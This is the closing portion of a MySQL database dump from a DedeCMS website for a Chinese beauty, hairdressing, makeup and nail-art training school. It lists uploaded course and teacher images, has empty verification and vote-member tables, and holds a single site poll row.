/*!40000 ALTER TABLE `dede_uploads` DISABLE KEYS */;
INSERT INTO `dede_uploads` VALUES (1,0,'1-1Z2211P4030-L.jpg','/uploads/allimg/190221/1-1Z2211P4030-L.jpg',1,'0','0','0',535849,1550743443,1),(2,2,'美容课程测试1美容课程测试1美容课程测试1','/uploads/allimg/190221/1-1Z2211P4030-L-lp.jpg',1,'0','0','0',7963,1550744344,1),(3,0,'190221/1-1Z2211R91S31.jpg','/uploads/190221/1-1Z2211R91S31.jpg',1,'2000','600','0',214485,1550744958,1),(4,3,'美容院实战班','/uploads/allimg/190221/1-1Z22120111E28.jpg',1,'700','390','0',45704,1550751076,1),(5,6,'美发精英班','/uploads/allimg/190221/1-1Z221202S11G.jpg',1,'1000','666','0',40988,1550752111,1),(6,7,'中工升发型师班','/uploads/allimg/190221/1-1Z221202913415.jpg',1,'1000','684','0',62572,1550752153,1),(7,17,'化妆晚装精英班','/uploads/allimg/190221/1-1Z22120413WK.jpg',1,'370','245','0',62626,1550752898,1),(8,18,'化妆晚装整体形象设计','/uploads/allimg/190221/1-1Z221204212O1.jpg',1,'640','424','0',181000,1550752932,1),(9,19,'学员考试作品-中式新娘整体造型','/uploads/allimg/190221/1-1Z221204314157.jpg',1,'842','558','0',211161,1550752994,1),(10,22,'美容美体学员一对一实操','/uploads/allimg/190221/1-1Z221221340441.jpg',1,'700','468','0',61590,1550758420,1),(11,23,'美容美体学员一对一实操2','/uploads/allimg/190221/1-1Z2212214043H.jpg',1,'700','525','0',58385,1550758444,1),(12,24,'美容美体学员一对一实操3','/uploads/allimg/190221/1-1Z2212214293O.jpg',1,'700','454','0',67452,1550758469,1),(13,0,'190222/1-1Z2220045341S.jpg','/uploads/190222/1-1Z2220045341S.jpg',1,'1280','720','0',292169,1550767534,1),(14,25,'美发老师—Give','/uploads/allimg/190223/1-1Z22315410I92.jpg',1,'675','675','0',79646,1550907667,1),(15,26,'美甲老师-金妍','/uploads/allimg/190223/1-1Z2231606345V.jpg',1,'675','675','0',77423,1550909194,1),(16,27,'美发老师-欧阳','/uploads/allimg/190223/1-1Z223160U12c.jpg',1,'675','675','0',92061,1550909331,1),(17,28,'美发老师—孙向阳','/uploads/allimg/190223/1-1Z223160951101.jpg',1,'675','675','0',71105,1550909391,1),(18,29,'美发老师—王慧勇','/uploads/allimg/190223/1-1Z223161041V9.jpg',1,'675','675','0',57858,1550909441,1),(19,30,'化妆老师—邝程琳','/uploads/allimg/190223/1-1Z223161209207.jpg',1,'675','675','0',48333,1550909529,1),(20,31,'美容老师—李亚伦','/uploads/allimg/190223/1-1Z223161333154.jpg',1,'675','675','0',51136,1550909613,1),(21,32,'化妆老师—赵凌凌','/uploads/allimg/190223/1-1Z223161412954.jpg',1,'675','675','0',49232,1550909652,1),(22,33,'美发老师—吕连博','/uploads/allimg/190223/1-1Z22316145M33.jpg',1,'675','675','0',44260,1550909697,1),(23,0,'190223/1-1Z22316162B02.jpg','/uploads/190223/1-1Z22316162B02.jpg',1,'1920','280','0',63288,1550909786,1),(24,0,'190223/1-1Z223161Z0101.jpg','/uploads/190223/1-1Z223161Z0101.jpg',1,'1920','440','0',238347,1550909940,1),(25,0,'190223/1-1Z223162540449.png','/uploads/allimg/190222/190223/1-1Z223162540449.png',1,'1336','451','0',758337,1550910340,1),(26,0,'190223/1-1Z223162F1110.jpg','/uploads/190222/190223/1-1Z223162F1110.jpg',1,'1336','451','0',89142,1550910421,1),(27,0,'190223/1-1Z2231F454437.jpg','/uploads/190223/1-1Z2231F454437.jpg',1,'2000','800','0',220725,1550912694,1),(28,34,'美容学员实操1','/uploads/allimg/190223/1-1Z2231IZ91M.jpg',1,'470','285','0',174302,1550914749,1),(29,5,'美容精英班','/uploads/190223/1-1Z2231Q35Qa.jpg',1,'271','377','0',85913,1550916838,1),(30,4,'美容全能班','/uploads/190223/1-1Z2231Q43Y41.jpg',1,'271','377','0',90723,1550916878,1),(31,3,'美容院实战班','/uploads/190223/1-1Z2231Q51J60.jpg',1,'271','377','0',99614,1550916917,1),(32,35,'美容腰部按摩','/uploads/allimg/190223/1-1Z2231Z55C63.jpg',1,'800','534','0',147788,1550919956,1),(33,36,'美容头部按摩','/uploads/allimg/190223/1-1Z2231ZH4W9.jpg',1,'800','507','0',83656,1550920044,1),(34,37,'背部美容','/uploads/allimg/190223/1-1Z2231ZPC18.jpg',1,'800','532','0',208164,1550920086,1),(35,38,'艾灸美容','/uploads/allimg/190223/1-1Z2231ZZO95.jpg',1,'800','566','0',240017,1550920147,1),(36,39,'美容刮痧','/uploads/allimg/190223/1-1Z2231Z9335X.jpg',1,'800','587','0',149322,1550920173,1),(37,40,'美容护肤','/uploads/allimg/190223/1-1Z22319100I01.jpg',1,'800','531','0',242593,1550920207,1),(38,41,'美容师必学的皮肤美容知识','/uploads/allimg/190223/1-1Z2231914015S.jpg',1,'800','507','0',83656,1550920441,1),(39,41,'美容师必学的皮肤美容知识','/uploads/allimg/190223/1-1Z2231914340-L.jpg',1,'0','0','0',83656,1550920474,1),(40,42,'美容护肤的五大步骤','/uploads/allimg/190223/1-1Z223191623942.jpg',1,'800','534','0',220545,1550920583,1),(41,43,'皮肤基础班课程','/uploads/allimg/190223/1-1Z22319320X24.jpg',1,'800','507','0',84693,1550921528,1),(42,43,'皮肤基础班课程','/uploads/allimg/190223/1-1Z22319320X24-lp.jpg',1,'0','0','0',9143,1550921574,1),(43,43,'皮肤基础班课程','/uploads/allimg/190223/1-1Z2231934370-L.jpg',1,'0','0','0',51768,1550921677,1),(44,43,'皮肤基础班课程','/uploads/190223/190223/1-1Z22319345WY.jpg',1,'364','507','0',51768,1550921698,1),(45,44,'新手美容师必知的销售技巧','/uploads/allimg/190223/1-1Z223204000495.jpg',1,'470','285','0',174302,1550925600,1),(46,0,'190223/1-1Z223223152I1.jpg','/uploads/190222/190223/1-1Z223223152I1.jpg',1,'1668','564','0',90841,1550932312,1),(47,15,'2018年美发2期学员实操','/uploads/allimg/190224/1-1Z224113045H7.jpg',1,'470','285','0',170988,1550979045,1),(48,14,'2018年3月美发初级班实操作品','/uploads/allimg/190224/1-1Z2241131361c.jpg',1,'470','285','0',139628,1550979096,1),(49,0,'190224/1-1Z224113949451.jpg','/uploads/allimg/190224/1-1Z224113949451.jpg',1,'370','245','0',50242,1550979589,1),(50,45,'学校前台','/uploads/allimg/190224/1-1Z224143629140.jpg',1,'470','285','0',17344,1550990189,1),(51,45,'学校前台','/uploads/allimg/190224/1-1Z224143QX37.jpg',1,'470','285','0',19501,1550990298,1),(52,46,'学校资质','/uploads/allimg/190224/1-1Z22414402G60.jpg',1,'483','432','0',39275,1550990427,1),(53,0,'190224/1-1Z224212149637.jpg','/uploads/190223/190224/1-1Z224212149637.jpg',1,'1920','577','0',146632,1551014509,1),(54,8,'美发店长班（技术总监班）','/uploads/190223/190224/1-1Z22423054c57.jpg',1,'288','404','0',100468,1551020749,1),(55,4,'美容全能班','/uploads/190223/1-1Z2231Q43Y41-lp.jpg',1,'0','0','0',8526,1551088896,1),(56,0,'190226/1-1Z226144233426.jpg','/uploads/190226/1-1Z226144233426.jpg',1,'2000','583','0',458519,1551163353,1),(57,0,'190226/1-1Z22614433V63.jpg','/uploads/190226/1-1Z22614433V63.jpg',1,'2000','583','0',329657,1551163418,1),(58,0,'1-1Z2261636300-L.jpg','/uploads/allimg/190226/1-1Z2261636300-L.jpg',1,'0','0','0',69928,1551170190,1),(59,0,'1-1Z226163S10-L.jpg','/uploads/allimg/190226/1-1Z226163S10-L.jpg',1,'0','0','0',105006,1551170311,1),(60,0,'1-1Z2261H5100-L.jpg','/uploads/allimg/190226/1-1Z2261H5100-L.jpg',1,'0','0','0',69771,1551173110,1),(61,34,'美容学员实操1','/uploads/190226/190226/1-1Z226202G0K5.jpg',1,'120','180','0',35003,1551184030,1),(62,0,'190226/1-1Z226230603S6.jpg','/uploads/190226/1-1Z226230603S6.jpg',1,'1920','500','0',139723,1551193563,1),(63,0,'190227/1-1Z22F12533325.jpg','/uploads/190227/1-1Z22F12533325.jpg',1,'1920','500','0',136641,1551201933,1),(64,0,'190227/1-1Z22F12I3107.jpg','/uploads/190227/1-1Z22F12I3107.jpg',1,'1920','500','0',134932,1551202053,1),(65,0,'1902/1-1Z22G42Q11L.jpg','/uploads/1902/1-1Z22G42Q11L.jpg',1,'1920','568','0',111181,1551248891,1),(66,0,'1902/1-1Z22G55212118.jpg','/uploads/1902/1-1Z22G55212118.jpg',1,'1920','568','0',129525,1551253932,1),(67,0,'1902/1-1Z22G5595a57.jpg','/uploads/1902/1-1Z22G5595a57.jpg',1,'1920','568','0',125094,1551254399,1),(68,0,'1902/1-1Z22G620355G.jpg','/uploads/1902/1-1Z22G620355G.jpg',1,'1920','568','0',127316,1551255635,1),(69,0,'1902/1-1Z22G63233O7.jpg','/uploads/1902/1-1Z22G63233O7.jpg',1,'1920','568','0',103696,1551256353,1),(70,0,'1902/1-1Z22GA433501.jpg','/uploads/1902/1-1Z22GA433501.jpg',1,'1920','568','0',142303,1551257673,1),(71,0,'1902/1-1Z22GQTC06.jpg','/uploads/1902/1-1Z22GQTC06.jpg',1,'1920','568','0',123973,1551262726,1),(72,0,'1902/1-1Z22H10Hc95.jpg','/uploads/1902/1-1Z22H10Hc95.jpg',1,'1920','568','0',134404,1551272849,1),(73,0,'1-1Z22H220550-L.jpg','/uploads/allimg/1902/1-1Z22H220550-L.jpg',1,'0','0','0',130839,1551277255,1),(74,0,'1-1Z22H224260-L.jpg','/uploads/allimg/1902/1-1Z22H224260-L.jpg',1,'0','0','0',366945,1551277466,1),(75,0,'1902/1-1Z22H22914222.jpg','/uploads/1902/1-1Z22H22914222.jpg',1,'1920','568','0',117634,1551277754,1),(76,0,'1902/1-1Z22H33550296.jpg','/uploads/1902/1-1Z22H33550296.jpg',1,'1920','568','0',81661,1551281750,1),(77,0,'1902/1-1Z22P00225A7.jpg','/uploads/1902/1-1Z22P00225A7.jpg',1,'1920','568','0',58794,1551283345,1),(78,0,'1902/1-1Z22P01FJa.jpg','/uploads/1902/1-1Z22P01FJa.jpg',1,'1920','568','0',47720,1551284227,1),(79,0,'1902/1-1Z22P02GD41.jpg','/uploads/1902/1-1Z22P02GD41.jpg',1,'1920','568','0',117634,1551284836,1),(80,5,'美容精英班','/uploads/190227/1903/1-1Z302210SDN.jpg',1,'364','506','0',48863,1551532116,1),(81,4,'美容全能班','/uploads/190227/1903/1-1Z302210ZM19.jpg',1,'364','507','0',54031,1551532147,1),(82,3,'美容院实战班','/uploads/190227/1903/1-1Z3022109302M.jpg',1,'364','507','0',49875,1551532170,1),(83,8,'美发店长班（技术总监班）','/uploads/1903/1-1Z30315392QB.jpg',1,'364','507','0',73434,1551598768,1),(84,7,'中工升发型师班','/uploads/1903/1-1Z30315395b55.jpg',1,'364','508','0',60156,1551598799,1),(85,6,'美发精英班','/uploads/1903/1-1Z303154042L1.jpg',1,'364','507','0',84683,1551598842,1),(86,18,'化妆晚装整体形象设计','/uploads/1903/1-1Z303155I6451.jpg',1,'297','400','0',29737,1551599856,1),(87,16,'影楼新娘跟妆课程','/uploads/1903/1-1Z303155Q6251.jpg',1,'267','400','0',34906,1551599896,1),(88,17,'化妆晚装精英班','/uploads/1903/1-1Z303155S5Y3.jpg',1,'364','508','0',73088,1551599915,1),(89,16,'影楼新娘跟妆课程','/uploads/1903/1-1Z303160JV29.jpg',1,'364','508','0',75463,1551600468,1),(90,64,'新手学理发多久能出师','/uploads/1903/1-1Z303162435R7.jpg',1,'262','388','0',54553,1551601475,1),(91,65,'如何选择适合自己的化妆培训课程','/uploads/allimg/1903/1-1Z3031Q3090-L.jpg',1,'0','0','0',29737,1551607989,1),(92,65,'如何选择适合自己的化妆培训课程','/uploads/1903/1-1Z3031Q330555.jpg',1,'297','400','0',29737,1551608010,1),(93,66,'零基础到专业化妆师需要多久','/uploads/1903/1903/1-1Z3031Q6112H.jpg',1,'267','400','0',26144,1551608171,1),(94,67,'2018年美容美发行业市场规模及发展趋势预测','/uploads/1903/1-1Z303195053606.png',1,'536','360','0',35156,1551613853,1),(95,48,'美甲中级课程','/uploads/1903/1-1Z30321055W19.jpg',1,'364','507','0',68205,1551618358,1),(96,47,'美甲基础课程','/uploads/1903/1-1Z303210TS45.jpg',1,'364','505','0',53309,1551618528,1),(97,64,'新手学理发多久能出师','/uploads/1903/1-1Z303214I4916.jpg',1,'364','507','0',32274,1551620854,1),(98,68,'快速剪短发方法和技巧','/uploads/1903/1-1Z303215213154.jpg',1,'364','508','0',60156,1551621133,1),(99,40,'美容护肤','/uploads/1903/1-1Z306205055D3.jpg',1,'364','508','0',69835,1551876655,1),(100,39,'美容刮痧','/uploads/1903/1-1Z306210001492.jpg',1,'364','506','0',64232,1551877201,1),(101,38,'艾灸美容','/uploads/1903/1-1Z30621051D56.jpg',1,'364','506','0',41241,1551877516,1),(102,37,'背部美容','/uploads/1903/1-1Z306210643932.jpg',1,'364','507','0',60268,1551877603,1),(103,34,'美容学员实操1','/uploads/1903/1903/1-1Z30621130b24.jpg',1,'364','509','0',40192,1551877989,1),(104,24,'美容美体学员一对一实操3','/uploads/1903/1-1Z3062114552H.jpg',1,'364','509','0',40749,1551878095,1),(105,23,'美容美体学员一对一实操2','/uploads/1903/1-1Z306211A13A.jpg',1,'364','509','0',40749,1551878211,1),(106,22,'面部美容实操','/uploads/1903/1-1Z306211924456.jpg',1,'364','509','0',40097,1551878364,1),(107,69,'半永久美容考核','/uploads/allimg/1903/1-1Z3062120590-L.jpg',1,'0','0','0',36513,1551878459,1),(108,69,'半永久美容考核','/uploads/1903/1-1Z30621210c55.jpg',1,'364','509','0',36513,1551878469,1),(109,15,'美发学员烫染练习','/uploads/1903/1-1Z30621260W20.jpg',1,'364','509','0',38659,1551878768,1),(110,14,'美发老师指导练习','/uploads/1903/1-1Z306212R2915.jpg',1,'364','509','0',43456,1551878902,1),(111,70,'美发理论学习实景','/uploads/1903/1-1Z306213102330.jpg',1,'364','509','0',44004,1551879062,1),(112,71,'美发学员练习操作','/uploads/1903/1-1Z3062133562X.jpg',1,'364','509','0',37124,1551879236,1),(113,72,'一对一指导练习','/uploads/1903/1-1Z306213531619.jpg',1,'364','509','0',40328,1551879331,1),(114,52,'美发精剪造型','/uploads/1903/1-1Z306213G9146.jpg',1,'364','507','0',73434,1551879439,1),(115,51,'美发色彩作品','/uploads/1903/1-1Z306213RD22.jpg',1,'364','507','0',40411,1551879506,1),(116,50,'洗吹造型作品','/uploads/1903/1-1Z306214215939.jpg',1,'364','506','0',41089,1551879735,1),(117,49,'美发染色作品','/uploads/1903/1-1Z30621440CW.jpg',1,'364','507','0',40411,1551879846,1),(118,51,'美发色彩作品','/uploads/1903/1-1Z306214H3417.jpg',1,'364','507','0',33104,1551880043,1),(119,10,'美发造型作品','/uploads/1903/1-1Z30621510a05.jpg',1,'364','507','0',32274,1551880269,1),(120,36,'头部按摩','/uploads/1903/1-1Z306220041213.jpg',1,'364','507','0',50156,1551880841,1),(121,35,'腰部按摩','/uploads/1903/1-1Z306220141M2.jpg',1,'364','507','0',54031,1551880901,1),(122,68,'快速剪短发方法和技巧','/uploads/190221/1903/1-1Z306220635933.jpg',1,'364','508','0',60156,1551881195,1),(123,63,'发型不满意，你需要和发型师＂近距离＂沟通','/uploads/190221/1903/1-1Z30622102b63.jpg',1,'364','506','0',56868,1551881429,1),(124,62,'2019年学美发前景好吗','/uploads/190221/1903/1-1Z306221143503.jpg',1,'364','507','0',38925,1551881503,1),(125,61,'学理发一般要学多久','/uploads/190221/1903/1-1Z306221456308.jpg',1,'364','506','0',43523,1551881696,1),(126,13,'美发师剪发小技巧 剪发操作小技巧','/uploads/190221/1903/1-1Z306221520311.jpg',1,'364','508','0',38505,1551881720,1),(127,12,'新手学理发基本步骤 哪些技巧要掌握','/uploads/190221/1903/1-1Z306221540J8.jpg',1,'364','507','0',73434,1551881740,1),(128,11,'简单易学的剪发技巧：五点定位剪法','/uploads/190221/1903/1-1Z306221606151.jpg',1,'364','506','0',50104,1551881766,1),(129,44,'新手美容师必知的销售技巧','/uploads/190221/1903/1-1Z3062219311P.jpg',1,'364','508','0',69203,1551881971,1),(130,19,'化妆学员上课实景','/uploads/190221/1903/1-1Z306223R1W0.jpg',1,'364','509','0',49698,1551883101,1),(131,73,'化妆学员互相练习','/uploads/190221/1903/1-1Z306223942c4.jpg',1,'364','509','0',46850,1551883182,1),(132,74,'化妆学员实操','/uploads/190221/1903/1-1Z30622412B25.jpg',1,'204','285','0',24589,1551883286,1),(133,75,'形象设计师——创造维纳斯之美','/uploads/190221/1903/1-1Z306224511D8.jpg',1,'364','507','0',65407,1551883511,1),(134,60,'化妆作品欣赏','/uploads/190221/1903/1-1Z306224635912.jpg',1,'364','509','0',52655,1551883595,1),(135,76,'彩妆造型作品','/uploads/190221/1903/1-1Z306225930246.jpg',1,'364','506','0',26057,1551884370,1),(136,77,'化妆妆容作品','/uploads/190221/1903/1-1Z306230111508.jpg',1,'364','506','0',61461,1551884471,1),(137,78,'化妆培训作品','/uploads/190221/1903/1-1Z306230232646.jpg',1,'364','506','0',33221,1551884552,1),(138,79,'美甲学员手操','/uploads/190221/1903/1-1Z306230352356.jpg',1,'364','509','0',40390,1551884632,1),(139,80,'美甲学员练习实景','/uploads/190221/1903/1-1Z30623052G23.jpg',1,'364','506','0',54509,1551884727,1),(140,81,'美甲老师指导','/uploads/190221/1903/1-1Z306230A2938.jpg',1,'364','509','0',51510,1551884812,1),(141,82,'美甲学员实操','/uploads/190221/1903/1-1Z306230Q2D4.jpg',1,'300','419','0',29522,1551884892,1),(142,83,'美甲培训作品','/uploads/190221/1903/1-1Z306232254102.jpg',1,'364','507','0',68205,1551885774,1),(143,84,'美甲培训作品','/uploads/190221/1903/1-1Z306232432M6.jpg',1,'364','508','0',33192,1551885872,1),(144,85,'美甲培训作品','/uploads/190221/1903/1-1Z306232542458.jpg',1,'364','507','0',42992,1551885942,1),(145,86,'美甲培训作品','/uploads/190221/1903/1-1Z30623264KA.jpg',1,'364','506','0',51701,1551886007,1),(146,0,'1903/1-1Z30H14535U7.jpg','/uploads/190222/1903/1-1Z30H14535U7.jpg',1,'1920','500','0',147901,1551966335,1),(147,0,'1903/1-1Z30H2235BC.jpg','/uploads/190222/1903/1-1Z30H2235BC.jpg',1,'1100','509','0',101133,1551968636,1),(148,87,'2018中国技能大赛全国商业行业美发美容职业技能','/uploads/1903/1-1Z31222294G58.jpg',1,'263','366','0',60943,1552400987,1),(149,67,'2018年美容美发行业市场规模及发展趋势预测','/uploads/1903/1-1Z312235512P4.jpg',1,'364','506','0',58866,1552406112,1),(150,88,'学一门技术照样能成才！美容师、美发师、美甲','/uploads/1903/1-1Z312235S5209.jpg',1,'364','507','0',44456,1552406315,1),(151,46,'学校资质','/uploads/allimg/190224/1-1Z22414402G60-lp-lp.jpg',1,'0','0','0',10528,1552534311,1),(152,97,'影视剧组就业班','/uploads/allimg/1909/1-1Z9162232270-L.jpg',1,'0','0','0',35752,1568644347,1),(153,97,'影视剧组就业班','/uploads/190226/1909/1-1Z916223614E3.jpg',1,'364','507','0',65407,1568644574,1),(154,98,'化妆老师-于健','/uploads/allimg/1909/1-1Z9162300160-L.jpg',1,'0','0','0',131891,1568646016,1),(155,99,'美发老师-刘文佳','/uploads/allimg/1909/1-1Z9162302230-L.jpg',1,'0','0','0',182589,1568646143,1),(156,90,'高级化妆讲师—李晓','/uploads/190226/1909/1-1Z916232A9551.jpg',1,'675','675','0',114514,1568647619,1),(157,100,'影视剧组就业班','/uploads/allimg/1909/1-1Z9162353240-L.jpg',1,'0','0','0',65407,1568649204,1),(158,101,'影视剧组签约就业班','/uploads/allimg/1910/1-191001000G10-L.jpg',1,'0','0','0',64755,1569859631,1),(159,102,'韩式半永久纹绣','/uploads/allimg/1910/1-191001001F30-L.jpg',1,'0','0','0',78646,1569860223,1),(160,102,'韩式半永久纹绣','/uploads/1910/1-191001002441535.jpg',1,'273','379','0',19586,1569860681,1),(161,101,'影视剧组签约就业班','/uploads/1910/1-191001002JA49.jpg',1,'364','506','0',86417,1569860866,1);
/*!40000 ALTER TABLE `dede_uploads` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_verifies`
--

DROP TABLE IF EXISTS `dede_verifies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_verifies` (
  `nameid` char(32) NOT NULL DEFAULT '',
  `cthash` varchar(32) NOT NULL DEFAULT '',
  `method` enum('local','official') NOT NULL DEFAULT 'official',
  `filename` varchar(254) NOT NULL DEFAULT '',
  PRIMARY KEY (`nameid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_verifies`
--

LOCK TABLES `dede_verifies` WRITE;
/*!40000 ALTER TABLE `dede_verifies` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_verifies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_vote`
--

DROP TABLE IF EXISTS `dede_vote`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_vote` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `votename` varchar(50) NOT NULL DEFAULT '',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `totalcount` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ismore` tinyint(6) NOT NULL DEFAULT '0',
  `isallow` tinyint(6) NOT NULL DEFAULT '0',
  `view` tinyint(6) NOT NULL DEFAULT '0',
  `spec` int(20) unsigned NOT NULL DEFAULT '0',
  `isenable` tinyint(6) NOT NULL DEFAULT '0',
  `votenote` text,
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_vote`
--

LOCK TABLES `dede_vote` WRITE;
/*!40000 ALTER TABLE `dede_vote` DISABLE KEYS */;
INSERT INTO `dede_vote` VALUES (1,'你是从哪儿得知本站的？',1266336000,1584547200,0,0,1,1,0,0,'<v:note id=\"1\" count=\"1\">朋友介绍</v:note>rn<v:note id=\"2\" count=\"0\">门户网站的搜索引擎</v:note>rn<v:note id=\"3\" count=\"2\">Google或百度搜索</v:note>rn<v:note id=\"4\" count=\"2\">别的网站上的链接</v:note>rn<v:note id=\"5\" count=\"1\">其它途径</v:note>rn');
/*!40000 ALTER TABLE `dede_vote` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_vote_member`
--

DROP TABLE IF EXISTS `dede_vote_member`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_vote_member` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `voteid` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` varchar(50) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_vote_member`
--

LOCK TABLES `dede_vote_member` WRITE;
/*!40000 ALTER TABLE `dede_vote_member` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_vote_member` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-10-17 18:23:51
